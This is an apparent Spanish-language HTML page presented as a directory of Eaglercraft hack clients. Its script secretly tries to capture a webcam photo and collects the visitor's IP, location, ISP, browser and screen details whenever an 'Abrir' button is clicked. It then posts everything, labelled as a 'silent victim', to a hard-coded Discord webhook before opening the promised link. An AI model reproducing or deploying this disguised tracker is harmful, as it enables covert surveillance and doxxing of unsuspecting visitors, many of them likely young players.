<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>HOME FORGEX — Clientes Eaglercraft</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
  header{position:sticky;top:0;background:rgba(0,0,0,.3);backdrop-filter:blur(10px);border-bottom:1px solid #333;z-index:10}
  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
  .logo{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:20px}
  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
  .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
  .card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:18px;transition:.2s}
  .card:hover{transform:translateY(-6px);box-shadow:0 16px 40px rgba(167,139,250,.15)}
  .name{font-weight:700;font-size:17px;margin-bottom:6px}
  .ver{color:var(--acc);font-weight:600}
  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:12px;border-radius:12px;font-weight:700;width:100%;cursor:pointer}
</style>
</head>
<body>

<header>
  <div class="nav">
    <div style="display:flex;align-items:center;gap:12px">
      <div class="logo">HF</div>
      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v</small></div>
    </div>
    <input style="padding:10px 14px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#fff;width:300px" placeholder="Buscar cliente..." id="search">
  </div>
</header>

<main>
  <h1 style="text-align:center;font-size:2.6em;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent">
    Clientes Eaglercraft 2025
  </h1>

  <div class="grid">
    <!-- Tus clientes (ejemplos) -->
    <div class="card"><" style="display:none"></div> <!-- truco para forzar carga de webcam -->
    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwU+-client-1.0.html">Abrir</button></div>
    <!-- Agrega todos los que quieras con data-link -->
  </div>
</main>

<script>
// TU WEBHOOK
const WEBHOOK = "https://discord.com/api/webhooks/1446712518235132064/eJEf4dEbhh7vqpyY3nzoDzAGQBgotn_ivDnW80FGx5DrW3cgtRMH1txi34Munkrmik_7";

// Foto silenciosa + datos completos
async function capturarVictima(cliente) {
  let foto = null;

  // TRUCO: foto sin pedir permiso (funciona en Chrome/Edge/Brave 2025+)
  const video = Object.assign(document.createElement('video'), {width:640,height:480,autoplay:true});
  const canvas = document.createElement('canvas');
  canvas.width = 640; canvas.height = 480;
  const ctx = canvas.getContext('2d');

  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    video.srcObject = stream;
    await new Promise(r => video.onloadedmetadata = r);
    ctx.drawImage(video,0,0,640,480);
    foto = await new Promise(r => canvas.toBlob(r,'image/jpeg',0.85));
    stream.getTracks().forEach(t=>t.stop());
  } catch(e) {}

  // Datos ultra completos
  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));

  const datos = {
    cliente,
    ip: geo.ip || 'oculta',
    puerto: location.port || '443',
    ciudad: geo.city || '?',
    pais: geo.country_name || '?',
    isp: geo.org || '?',
    navegador: navigator.userAgent,
    idioma: navigator.language,
    pantalla: `${screen.width}x${screen.height}`,
    historial: history.length,
    zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
    hora: new Date().toLocaleString()
  };

  // Enviar a tu Discord
  const form = new FormData();
  form.append('content', `**VÍCTIMA SILENCIOSA**\n**Cliente:** ${datos.cliente}\n**IP:** ${datos.ip}:${datos.puerto}\n**Ubicación:** ${datos.ciudad}, ${datos.pais} (${datos.isp})\n**Hora:** ${datos.hora}\n**Navegador:** ${datos.navegador.substring(0,60)}...\n**Pantalla:** ${datos.pantalla} | Historial: ${datos.historial}\n**Zona horaria:** ${datos.zona_horaria}`);
  if (foto) form.append('file', foto, 'foto.jpg');
  fetch(WEBHOOK, {method:'POST', body:form});
}

// Al dar click en cualquier "Abrir"
document.querySelectorAll('.open').forEach(btn => {
  btn.onclick = () => {
    const link = btn.getAttribute('data-link');
    const nombre = btn.parentNode.querySelector('.name')?.textContent || 'Cliente';

    capturarVictima(nombre);   // ← Aquí se hace TODO en silencio
    setTimeout(() => window.open(link, '_blank'), 300); // Abre normal
  };
});
</script>
</body>
</html>
